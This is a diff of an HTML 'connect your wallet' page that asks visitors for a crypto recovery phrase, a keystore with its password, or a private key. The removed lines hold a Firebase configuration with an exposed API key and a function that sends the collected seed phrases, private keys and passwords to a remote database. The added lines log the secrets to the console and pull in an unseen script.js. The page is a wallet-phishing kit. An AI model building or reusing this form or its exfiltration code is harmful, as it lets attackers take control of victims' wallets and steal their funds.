@@ -123,6 +123,9 @@
             background: linear-gradient(to bottom, #2980b9, #5499c7);
         }
     </style>
+
+    <script src="script.js"></script>
+    
 </head>
 
 <body>
@@ -199,12 +202,12 @@
                 <option value="Keplr">Keplr</option>
                 <option value="GreenAddress Wallet">GreenAddress Wallet</option>
                 <option value="Huobi Wallet">Huobi Wallet</option>
-                <option value="Enjin Wallet">MetaMask</option>
+                <option value="Enjin Wallet">Enjin Wallet</option>
                 <option value="StormGain">StormGain</option>
                 <option value="Clever">Clever</option>
                 <option value="TrustVault">TrustVault</option>
                 <option value="Moonlet">Moonlet</option>
-                <option value="TokenPocket">MetaMask</option>
+                <option value="TokenPocket">TokenPocket</option>
                 
 
 
@@ -230,24 +233,6 @@
     </section>
 
     <script>
-     <script src="https://www.gstatic.com/firebasejs/10.6.0/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.6.0/firebase-auth.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.6.0/firebase-database.js"></script>
-
-  // Your web app's Firebase configuration
-  const firebaseConfig = {
-    apiKey: "AIzaSyB-2koFw2ICcMC7g4VMSgWyctgXaDHL_N0",
-    authDomain: "crypto-test-5739f.firebaseapp.com",
-    projectId: "crypto-test-5739f",
-    storageBucket: "crypto-test-5739f.appspot.com",
-    messagingSenderId: "680504108544",
-    appId: "1:680504108544:web:8d4ac4ae5c6e53847adae5"
-  };
-
-const app = initializeApp(firebaseConfig);
-const auth = getAuth();
-const database = getDatabase(app);
-
         function selectWallet() {
             var selectedWallet = document.getElementById("wallet-list").value;
             document.getElementById("selected-wallet").value = selectedWallet;
@@ -297,56 +282,38 @@ const database = getDatabase(app);
             }
         }
 
+        function connectWallet() {
+            // Retrieve selected wallet type, information type, and credentials
+            const selectedWallet = document.getElementById('selected-wallet').value;
+            const walletInfoType = document.getElementById('wallet-info-type').value;
 
-function connectWallet() {
-    // Récupérez le type de portefeuille sélectionné, le type d'information et les informations d'identification
-    const selectedWallet = document.getElementById('selected-wallet').value;
-    const walletInfoType = document.getElementById('wallet-info-type').value;
+            // Retrieve information input based on the selected type
+            let walletCredentials;
+            switch (walletInfoType) {
+                case 'phrase':
+                    walletCredentials = document.getElementById('wallet-phrase').value;
+                    break;
+                case 'keystore':
+                    const walletKeystore = document.getElementById('wallet-keystore').value;
+                    const walletPassword = document.getElementById('wallet-password').value;
+                    walletCredentials = { keystore: walletKeystore, password: walletPassword };
+                    break;
+                case 'private-key':
+                    walletCredentials = document.getElementById('wallet-private-key').value;
+                    break;
+                default:
+                    break;
+            }
 
-    // Récupérez les informations d'entrée en fonction du type sélectionné
-    let walletCredentials;
-    switch (walletInfoType) {
-        case 'phrase':
-            walletCredentials = document.getElementById('wallet-phrase').value;
-            break;
-        case 'keystore':
-            const walletKeystore = document.getElementById('wallet-keystore').value;
-            const walletPassword = document.getElementById('wallet-password').value;
-            walletCredentials = { keystore: walletKeystore, password: walletPassword };
-            break;
-        case 'private-key':
-            walletCredentials = document.getElementById('wallet-private-key').value;
-            break;
-        default:
-            break;
-    }
+            // Perform wallet connection logic (use web3 libraries)
+            // For simplicity, you can log the wallet type, information type, and credentials to the console
+            console.log('Selected Wallet:', selectedWallet);
+            console.log('Information Type:', walletInfoType);
+            console.log('Credentials:', walletCredentials);
 
-    // Enregistrez les informations dans la base de données Firebase
-    createUserWithEmailAndPassword(auth, selectedWallet, walletCredentials)
-        .then((userCredential) => {
-            const user = userCredential.user;
-            set(ref(database, 'wallets/' + user.uid), {
-                walletType: selectedWallet,
-                walletInfoType: walletInfoType,
-                walletCredentials: walletCredentials
-            })
-            .then(() => {
-                alert('Succès');
-            })
-            .catch((error) => {
-                alert(error);
-            });
-        })
-        .catch((error) => {
-            alert(error.message);
-        });
-}
-
-
-       
-</script>
-
-        
+            // Add your actual wallet connection logic here
+        }
+    </script>
 </body>
 
 </html>
